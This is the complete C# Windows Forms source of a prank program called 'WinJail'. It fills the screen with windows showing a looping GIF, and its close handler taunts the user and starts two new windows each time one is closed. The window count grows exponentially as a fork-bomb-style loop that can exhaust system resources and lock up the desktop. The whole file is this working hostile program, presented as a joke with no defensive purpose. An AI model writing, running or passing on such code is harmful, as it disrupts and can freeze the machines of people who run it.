using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace WinJail
{
    public partial class MainForm : Form
    {
        private static int windowCount = 0;
        private static readonly object lockObj = new object();

        private static int currentCol = 0;
        private static int currentRow = 0;
        private static int maxCols;
        private static int maxRows;
        private static int winWidth = 550;
        private static int winHeight = (int)(Screen.PrimaryScreen.Bounds.Height * 0.5);

        public MainForm()
        {
            InitializeComponent();
            this.Text = "WinJail - LoopHole Edition";

            InitializeUI();
            this.FormClosing += MainForm_FormClosing;

            lock (lockObj)
            {
                if (maxCols == 0 || maxRows == 0)
                {
                    maxCols = Screen.PrimaryScreen.Bounds.Width / winWidth;
                    maxRows = Screen.PrimaryScreen.Bounds.Height / winHeight;
                }

                if (windowCount < maxCols * maxRows)
                {
                    this.StartPosition = FormStartPosition.Manual;
                    this.Location = new Point(currentCol * winWidth, currentRow * winHeight);
                    currentCol++;

                    if (currentCol >= maxCols)
                    {
                        currentCol = 0;
                        currentRow++;
                    }
                }
                else
                {
                   
                    int offsetX = 30 * (windowCount - maxCols * maxRows);
                    int offsetY = 30 * (windowCount - maxCols * maxRows);
                    this.StartPosition = FormStartPosition.Manual;
                    this.Location = new Point(100 + offsetX, 100 + offsetY);
                }

                windowCount++;
            }
        }

        private void InitializeUI()
        {
            this.Width = winWidth;
            this.Height = winHeight;
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;

            try
            {
                PictureBox gifBox = new PictureBox
                {
                    Image = Image.FromFile("loop.gif"),
                    SizeMode = PictureBoxSizeMode.StretchImage,
                    Dock = DockStyle.Fill
                };
                this.Controls.Add(gifBox);
                gifBox.SendToBack();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Failed to load GIF: " + ex.Message);
            }

            Panel overlay = new Panel
            {
                BackColor = Color.FromArgb(100, Color.DarkRed),
                Dock = DockStyle.Fill
            };
            this.Controls.Add(overlay);
        }

        private string[] messages = new string[]
        {
            "You can't escape!",
            "Try closing me again!",
            "I’m watching you...",
            "Gotcha!",
            "This is endless!",
        };

        private Random random = new Random();

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            string msg = messages[random.Next(messages.Length)];
            MessageBox.Show(msg, "WinJail says...", MessageBoxButtons.OK, MessageBoxIcon.Warning);

            for (int i = 0; i < 2; i++)
            {
                Thread t = new Thread(() =>
                {
                    Application.Run(new MainForm());
                });
                t.SetApartmentState(ApartmentState.STA);
                t.Start();
            }
        }
    }
}
